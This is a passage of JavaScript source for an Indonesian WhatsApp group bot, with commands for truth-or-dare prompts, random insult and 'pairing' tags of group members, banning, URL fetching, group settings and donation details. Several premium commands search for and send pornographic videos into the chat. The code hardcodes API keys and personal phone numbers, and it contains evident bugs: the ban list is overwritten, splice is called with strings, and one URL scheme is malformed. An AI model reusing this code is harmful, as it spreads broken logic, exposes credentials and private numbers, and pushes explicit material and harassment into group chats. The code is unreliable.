              const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi']
              const koh = kapan[Math.floor(Math.random() * kapan.length)]
              dha.sendMessage(from, '*Pertanyaan :* '+kapankah+'\n*Jawaban :* '+ koh, text, { quoted: mek })
              await limitAdd(sender)
break
       case 'truth':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
              const ttrth = trut[Math.floor(Math.random() * trut.length)]
              truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              dha.sendMessage(from, truteh, image, { caption: '*Truth*\n\n'+ ttrth, quoted: mek })
              await limitAdd(sender)
break
       case 'dare':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "??💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
              const der = dare[Math.floor(Math.random() * dare.length)]
              buffer = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              dha.sendMessage(from, buffer, image, { quoted: mek, caption: '*Dare*\n\n'+ der })
              await limitAdd(sender)
break		
       case 'jadian':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              jds = []
              jdii = groupMembers
              koss = groupMembers
              akuu = jdii[Math.floor(Math.random() * jdii.length)]
              diaa = koss[Math.floor(Math.random() * koss.length)]
              teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
              jds.push(akuu.jid)
              jds.push(diaa.jid)
              mentions(teks, jds, true)
              await limitAdd(sender)
break
       case 'cantik':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              membr = []
              const mes = groupMembers
              const msk = groupMembers
              const siaps = mes[Math.floor(Math.random() * mes.length)]
              const sips = pushname[Math.floor(Math.random() * msk.length)]
              teks = `*Yang Paling Cantik Disini Adalah :* @${siaps.jid.split('@')[0]}`
              membr.push(siaps.jid)
              mentions(teks, membr, true)
              await limitAdd(sender)
break
       case 'ganteng':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              membr = []
              const nus = groupMembers
              const msl = groupMembers
              const siapss = nus[Math.floor(Math.random() * nus.length)]
              const sipss = pushname[Math.floor(Math.random() * msl.length)]
              teks = `*Masih Gantengan Owner Gua :* @${siapss.jid.split('@')[0]}`
              membr.push(siapss.jid)
              mentions(teks, membr, true)
              await limitAdd(sender)
break
       case 'babi':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              membr = []
              const meg = groupMembers
              const mge = groupMembers
              const ba = meg[Math.floor(Math.random() * meg.length)]
              const bi = pushname[Math.floor(Math.random() * mge.length)]
              teks = `*Yang Paling Babi Disini Adalah :* @${ba.jid.split('@')[0]}`
              membr.push(ba.jid)
              mentions(teks, membr, true)
              await limitAdd(sender)
break
       case 'beban':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              membr = []
              const nge = groupMembers
              const tod = groupMembers
              const beb = nge[Math.floor(Math.random() * nge.length)]
              const an = pushname[Math.floor(Math.random() * tod.length)]
              teks = `*Yang Paling Beban Disini Adalah :* @${beb.jid.split('@')[0]}`
              membr.push(beb.jid)
              mentions(teks, membr, true)
              await limitAdd(sender)
break
//------------------< Lainnya >-------------------

				case 'ban':
					dha.updatePresence(from, Presence.composing) 
					if (args.length < 1) return
					if (!isOwner) return reply(mess.only.owner)
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
			        ban = mentioned
					reply(`berhasil banned : ${ban}`)
					
              await limitAdd(sender)
break
				case 'unban':
					if (!isOwner)return reply(mess.only.owner)
					bnnd = body.slice(8)
					ban.splice(`${bnnd}@s.whatsapp.net`, 1)
					reply(`Nomor wa.me/${bnnd} telah di unban!`)
					
              await limitAdd(sender)
break
        case 'getpp':
               if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
               linkpp = await dha.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
               buffer = await getBuffer(linkpp)
               dha.sendMessage(from, buffer, image, {caption: "Nih", quoted: mek })
               } else if (mek.message.extendedTextMessage.contextInfo.mentionedJid === null || mek.message.extendedTextMessage.contextInfo.mentionedJid === undefined) {
               mberr = mek.message.extendedTextMessage.contextInfo.participant
               linkpp = await dha.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
               buffer = await getBuffer(linkpp)
               dha.sendMessage(from, buffer, image, { quoted: mek, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
               } else if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0) {
               mberr = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
               linkpp = await dha.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
               buffer = await getBuffer(linkpp)
               dha.sendMessage(from, buffer, image, { quoted: mek, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
}
               
              await limitAdd(sender)
break
        case 'd':
        case 'del':
        case 'delete': // MR.CYSER
               try {
               if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply chat bot')
               dha.deleteMessage(from, {id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true})
               } catch (e){
               reply('Reply chat bot')
}
               
              await limitAdd(sender)
break
        case 'tes':
               reply('Okeh nyala')
               await limitAdd(sender)
break
        case 'info':  // Jangan Di Ubah Plise
               urlinfo = 'httpsl://telegra.ph/file/58f6d9179e497062a84b0.jpg'
               thankslort = `*━━━━INFO BOT━━━━*\n*O>Nama : Katashi-Botz*\n*O>JAM : ${moment().utcOffset('+0700').format('HH:mm')}*\n*O>DATE : ${moment.tz('Asia/Jakarta').format('DD/MM')}*\n*O>Tipe : Node Js*\n*O>Versi : 3.3*\n*━━━━━━━━━━━━━━━*`
             dha.sendMessage(from, await getBuffer(urlinfo), image, {quoted: mek, caption: thankslort })
             
              await limitAdd(sender)
break
      case 'get':
      case 'fetch': //ambil dari nuru
             if (!/^https?:\/\//.test(q)) return reply('Awali *URL* dengan http:// atau https://')
             res = await fetch(q)
             if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
             delete res
             throw `Content-Length: ${res.headers.get('content-length')}`
}
             if (!/text|json/.test(res.headers.get('content-type'))) return sendMediaURL(from, q)
             txtx = await res.buffer()
             try {
             txtx = util.format(JSON.parse(txtx+''))
             } catch (e) {
             txtx = txtx + ''
             } finally {
             reply(txtx.slice(0, 65536) + '')
}
             
              await limitAdd(sender)
break
      case 'searchmsg': 
case 'caripesan':  //by ANU TEAM
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
             if (args.length < 1) return reply(`Pesan Yang Mau Dicari Apaan?\nContoh : ${prefix + command} halo|10`)
             teks = arg
             if (teks.includes("|")) { 
             try {
             var ve = teks.split("|")[0]
             var za = teks.split("|")[1]
             sampai = `${za}`
             if (isNaN(sampai)) return reply('Harus berupa Angka!')
             batas = parseInt(sampai) + 1
             if (batas > 30) return reply('Maks 30!')
             sticWait(from)
             cok = await dha.searchMessages(`${ve}`, from, batas,1) 
             if (cok.messages.length < 2) return reply('Tidak Ditemukan Pesan') 
             if (cok.messages.length < parseInt(batas)) reply(`Hanya Ditemukan ${cok.messages.length - 1} Pesan`)
             for (i=1;i < cok.messages.length;i++) {
             if (cok.messages[i].message) {
             dha.sendMessage(from, `Ditemukan!`, text, {sendEphemeral: true, quoted: cok.messages[i]}) 
}
}
             } catch (e) {
             return reply(String(e))
}
             } else {
             reply(`Format salah tod, ini contoh format yang benar : ${prefix + command} halo|10`)
}
             await limitAdd(sender)
break
       case 'report':
              if (args.length < 1) return reply(`Ketik ${prefix}bugreport [fiturnya] [Error Nya Gimana]`) 
              teks = args.join(' ')
              reply('Terima Kasih Telah Melaporkan Bug Pada Owner, Jika Itu Sekedar Iseng Maka Akan Di Ban Oleh Bot!')
              dha.sendMessage('6281932664252@s.whatsapp.net',`*Bug Report:* ${teks}`, text)
              
              await limitAdd(sender)
break
       case 'readall':
              totalchat.map( async ({ jid }) => {
              await dha.chatRead(jid)
})
              reply(`\`\`\`Berhasil membaca ${unread.length} Chat !\`\`\``)
              console.log(totalchat.length)
              
              await limitAdd(sender)
break	
              
//-------------------< islam menu >--------------------

             
//------------------< serti menu >-------------------   

//------------------< cerita menu >-------------------

//------------------(KATA KATA MENU)---------+--------
                                         
//------------------< Maker Menu >--------------------   
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        

//------------------< enable/disable>-------------------
              
       case 'welcome':
               if (!isGroupAdmins) return reply(mess.only.admin)
               if (!isGroup) return reply(mess.only.group)
               if (args.length < 1) return reply('!welcome enable/disable')
               if ((args[0]) === 'enable') {
               if (isWelkom) return reply('Udah aktif')
               welkom.push(from)
               fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
               reply('Sukses mengaktifkan fitur welcome di group ini ✔️')
               } else if ((args[0]) === 'disable') {
               welkom.splice(from, 1)
               fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
               reply('Sukses menonaktifkan fitur welcome di group ini ✔️')
               } else {
               reply('Enable untuk mengaktifkan, disable untuk menonaktifkan')
}
               
              await limitAdd(sender)
break
case "antiviewonce":
      case "Antiviewonce":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntiviewonce) return reply("Sudah aktif!!");
          antivo.push(from);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mengaktifkan antiviewonce!");
        } else if (args[0] == "off") {
          antivo.splice(from, 1);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mematikan antiviewonce!");
        } else {
               reply('Enable untuk mengaktifkan, disable untuk menonaktifkan')
}


        await limitAdd(sender)
break
        case 'mute':
               if (!isGroup) return reply(mess.only.group)
               if (!isGroupAdmins && isPremium) return reply(mess.only.admin)
               if (args.length < 1) return reply('!mute enable/disable')
               if (args[0].toLowerCase() === 'enable'){
               if (isMuted) return reply(`udah di mute`)
               mute.push(from)
               fs.writeFileSync('./database/group/mute.json', JSON.stringify(mute))
               reply(`*...:* *MUTE ON* *:...*\n\nPerhatian untuk member grup\nBot telah di mute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${botName}*_`)
               } else if (args[0].toLowerCase() === 'disable'){
               anu = mute.indexOf(from)
               mute.splice(anu, 1)
               fs.writeFileSync('./database/group/mute.json', JSON.stringify(mute))
               reply(`*...:* *𝙈𝙐𝙏𝙀 𝙊𝙁𝙁* *:...*\n\nPerhatian untuk member grup\nBot telah di unmute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${botName}*_`)
               } else {
               reply(`Pilih enable atau disable`)
}
               
              await limitAdd(sender)
break
        case 'grupsetting':
        case 'groupsetting':
               if (!isGroup) return reply(mess.only.group)
               if (!isGroupAdmins && isPremium) return reply(mess.only.admin)
               list = []
               com = [`group buka`,`leveling enable`,`welcome enable`,`antilink enable`,`mute enable`]
               comm = [`group tutup`,`leveling disable`,`welcome disable`,`antilink disable`,`mute disable`]
               listnya = [`Group open/close`,`Leveling enable/disable`,`Welcome enable/disable`,`Antilink enable/disable`,`Mute enable/disable`]
               suruh = [`Enable`, `Disable`]
               fiturname = [`Group`,`Leveling`,`Welcome`,`Antilink`,`Mute`]
               startnum = 0; let startnu = 0; let startn = 0;let start = 0
               startnumm = 1
               for (let x of com) {
               var yy = {title: `${listnya[startnum++]}`,
                    rows: [
                       {
                        title: `${suruh[0]}`,
                        description: `\nMengaktifkan ${fiturname[startnu++]}`,
                        rowId: `${prefix}${x}`
                      },{
                        title: `${suruh[1]}`,
                        description: `\nMenonaktifkan ${fiturname[startn++]}`,
                        rowId: `${prefix}${comm[start++]}`
                      }
                    ]
                   }
                        list.push(yy)
           }
             listmsg(from, `Group Setting`, `Atur Settingan Grup anda disini......`, list)
        
             
              await limitAdd(sender)
break
 		case 'group':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins && isPremium) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (args[0] === 'buka') {
					    reply(`*BERHASIL MEMBUKA GROUP*`)
						dha.groupSettingChange(from, GroupSettingChange.messageSend, false)
					} else if (args[0] === 'tutup') {
						reply(`*BERHASIL MENUTUP GROUP*`)
						dha.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}
					
              await limitAdd(sender)
break                            
//------------------< Menunya Bang:v >-------------------
      case 'dana':
             reply(`DANA : 088706080295\n\n SAYA CUMAN BISA BILANG TERIMAKASIH ATAS KEMURAHAN HATI TUAN TELAH MEMBERIKAN KAMI BANTUAN.SEMOGA ALLAH MEMBALAS APA YG TUAN BERIKAN KE PADA SAYA`)
             
              await limitAdd(sender)
break
           case 'gopay':
             reply(`GOPAY : 081932664252\n\n SAYA CUMAN BISA BILANG TERIMAKASIH ATAS KEMURAHAN HATI TUAN TELAH MEMBERIKAN KAMI BANTUAN.SEMOGA ALLAH MEMBALAS APA YG TUAN BERIKAN KE PADA SAYA`)
             
              await limitAdd(sender)
break  
         case 'pulsa':
             reply(`PULSA : 088706080295\n\n SAYA CUMAN BISA BILANG TERIMAKASIH ATAS KEMURAHAN HATI TUAN TELAH MEMBERIKAN KAMI BANTUAN.SEMOGA ALLAH MEMBALAS APA YG TUAN BERIKAN KE PADA SAYA`)
             
              await limitAdd(sender)
break              
      case 'infoig':
             reply(`Jangan Lupa Follow Ig Owner Ya : https://www.instagram.com/rimuru145_`)
             
              await limitAdd(sender)
break
      case 'grupbot':
             reply('Diwajibkan join group bot\nhttps://chat.whatsapp.com/GDV8T3Mke6i253sl94GCmj')
             
              await limitAdd(sender)
break
    
case 'spotify':
case 'Spotify':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
                    url = args[0]
                    get_result = await fetchJson(`https://zenzapi.xyz/api/spotify?url=${url}&apikey=Katashi`)
                    get_result = get_result.data
                    ini_txt = `Title : ${get_result.name}\n`
                    ini_txt += `Artists : ${get_result.artists}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Album Name : ${get_result.album_name}\n`
                    ini_txt += `Release : ${get_result.release_date}\n`
                    thumbnail = await getBuffer(get_result.cover_url)
                    await dha.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    get_audio = await getBuffer(get_result.preview_url)
                    await dha.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: mek })
                    await limitAdd(sender)
break
                    
case 'xs':
case 'Xs':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Example: ${prefix + command} Blowjob`)
                    query = args.join(" ")
pepex = await fetchJson(`https://kocakz.herokuapp.com/api/media/xvideo/search?query=${query}`)
sticWait(from)
pepex = pepex.result
ini_txt = ""
for (var x of pepex) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Info : ${x.info}\n`
ini_txt += `Link : ${x.link}\n\n\n`
}
anu = `${ini_txt}\n\n  *DOWNLOAD*
 ${prefix}xvideo [link xvid] = Video`
dha.sendMessage(from, anu, text, {quoted: mek})
await limitAdd(sender)
break
case 'xvideos':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://kocakz.herokuapp.com/api/media/xvideo/detail?url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Link : ${get_result.URL}\n`
                    ini_txt += `Video Type : ${get_result.videoType}\n`
                    ini_txt += `Video Width : ${get_result.videoWidth}\n`
                    ini_txt += `Low : ${get_result.files.low}\n`
                    ini_txt += `High : ${get_result.files.high}\n`
                    thumbnail = await getBuffer(get_result.image)
                    await dha.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    vid = await getBuffer(get_result.files.low)
                    dha.sendMessage(from, vid, video, {quoted: mek})
                    await limitAdd(sender)
break
case 'xnxx':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://kocakz.herokuapp.com/api/media/xnxx/detail?url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Link : ${get_result.URL}\n`
                    ini_txt += `Video Type : ${get_result.videoType}\n`
                    ini_txt += `Video Width : ${get_result.videoWidth}\n`
                    ini_txt += `Low : ${get_result.files.low}\n`
                    ini_txt += `High : ${get_result.files.high}\n`
                    thumbnail = await getBuffer(get_result.image)
                    await dha.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    vid = await getBuffer(get_result.files.low)
                    dha.sendMessage(from, vid, video, {quoted: mek})
                    await limitAdd(sender)
break

case 'xnxxsearch':
case 'xn':
 case 'Xnxxsearch':
case 'Xs2':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
if (args.length == 0) return reply(`Example: ${prefix + command} query`)
                    c = args[0]
pepex = await fetchJson(`https://kocakz.herokuapp.com/api/media/xnxx/search?query=${c}`)
sticWait(from)
pepex = pepex.result
ini_txt = ""
for (var x of pepex) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Info : ${x.info}\n`
ini_txt += `Link : ${x.link}\n\n\n`
}
anu = `${ini_txt}\n\n  *DOWNLOAD*
 ${prefix}xnxx [link xvid] = Video`
dha.sendMessage(from, anu, text, {quoted: mek})
await limitAdd(sender)
break
        case 'meadmin':
        case 'Meadmin':
if (!isGroup) return reply('Khusus Group')
if (!isPremium) return reply(`Only Prem`)
if (isGroupAdmins) return reply('Lu Dah Admin Om')
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
dha.groupMakeAdmin(from, [sender])
reply('Sukses')
              await limitAdd(sender)
break
case 'cuaca':
case 'Cuaca':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args[0]
                    get_result = await fetchJson(`https://api.zekais.com/cuaca?daerah=${daerah}&apikey=zekais`)
                    ini_txt = `Tempat : ${get_result.Nama}\n`
                    ini_txt += `Cuaca : ${get_result.Cuaca}\n`
                    ini_txt += `Angin : ${get_result.Angin}\n`
                    ini_txt += `Description : ${get_result.Keterangan}\n`
                    ini_txt += `Kelembapan : ${get_result.Melembapan}\n`
                    ini_txt += `Suhu : ${get_result.Suhu}\n`
                    ini_txt += `Udara : ${get_result.Udara}\n`
                    await dha.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: mek })
                    reply(ini_txt)
                    await limitAdd(sender)
break
case 'nickepep': // Update By KATASHI 
case 'Nickepep': // Update By katashi 
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					data = await fetchJson(`https://api.zeks.xyz/api/nickepep?apikey=Iyungputra`, {method: 'get'})
					teks = ' \n'
					for (let i of data.result) {
						teks += `*Nick* : ${i}\n\n \n`
					}
					reply(teks.trim())
					
					await limitAdd(sender)
break
case 'urlshort': //By katashi
case 'url': //By katashi
case 'Urlshort': //By katashi
case 'Url': //By katashi
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                         if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
anu = await fetchJson(`https://api.zeks.xyz/api/urlshort?url=${query}&apikey=Iyungputra`, {method: 'get'})
teks = `${anu.result}`
dha.sendMessage(from, teks, text, {quoted: mek})
await limitAdd(sender)
break
case 'ppcp': //By katashi
case 'Ppcp': //By katashi
case 'ppcouple': //By katashi
case 'Ppcouple': //By katashi
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
anu = await fetchJson(`https://api.dapuhy.ga/api/randomimage/couple?apikey=Pkjf7IBi2md7UAK`, {method: 'get'})
image1 = await getBuffer(anu.result.pria)
image2 = await getBuffer(anu.result.wanita)
dha.sendMessage(from, image1, image, {quoted: mek })
dha.sendMessage(from, image2, image, {quoted: mek})
await limitAdd(sender)
break
case 'gfx': //By katashi
case 'Gfx': //By katashi
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
sticWait(from)
anu = await getBuffer(`https://velgrynd.herokuapp.com/api/gfx?nama=${query}`, {method: 'get'})
dha.sendMessage(from, anu, image, {quoted: mek })
await limitAdd(sender)
break
case 'gfx2': //By katashi
case 'Gfx2': //By katashi
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length < 1) return reply(`*Example :*\n${prefix}${command} +628xxx|yoo`)
					makell = args.join(" ")
					c1 = makell.split("|")[0];
					c2 = makell.split("|")[1];
sticWait(from)
anu = await getBuffer(`https://velgrynd.herokuapp.com/api/gfx3?text=${c1}&text2=${c2}`, {method: 'get'})
dha.sendMessage(from, anu, image, {quoted: mek })
await limitAdd(sender)
break
case 'simi':
case 'Simi':
case 'bot':
case 'Bot':
case 'katashi':
case 'Katashi':
case 'Putra':
case 'Putra':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`kamu ganteng`)
                    c = args.join(" ")
x = await fetchJson(`https://api.simsimi.net/v2/?text=${c}&lc=id`)
dha.sendMessage(from, `${x.success}`, text, {quoted: mek})
await limitAdd(sender)
break
case 'urlshort2': //By katashi
case 'url2': //By katashi
case 'Urlshort2': //By katashi
case 'Url2': //By katashi
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Link nya?`)
                    query = args.join(" ")	
anu = await fetchJson(`https://api.dapuhy.ga/api/others/cuttly?url=${query}&apikey=Pkjf7IBi2md7UAK`, {method: 'get'})
teks = `${anu.result}`
dha.sendMessage(from, teks, text, {quoted: mek})
await limitAdd(sender)
break
        case 'del':
		        case 'd':
		        case 'delete':             
case 'Del':
		        case 'D':
		        case 'Delete':                
				dha.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
              await limitAdd(sender)
break
case 'listdaerah': //By itsmeval
case 'Listdaerah':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
anu = await fetchJson(`https://api.zeks.xyz/api/jadwalsholat?apikey=Iyungputra&daerah=malang`, {method: 'get'})
teks = `${anu.listdaerah}`
dha.sendMessage(from, teks, text, {quoted: mek})
await limitAdd(sender)
break
case 'randomquran':
case 'Randomquran':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
            res = await axios.get(`https://api.zeks.me/api/randomquran?apikey=CpGSLymOQy9KfTKgQZr9eDSYqqR`)
            rquran = res.data.result
            teks = `*Surah* : ${rquran.nama}\n*Arti* : ${rquran.arti}\n*Ayat* : ${rquran.asma}\n*Keterangan* : ${rquran.keterangan}`
            reply(teks)
            dha.sendFileFromUrl(from, rquran.audio, 'quran.mp3', ``, message)
        await limitAdd(sender)
break
case 'style':
case 'Style':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
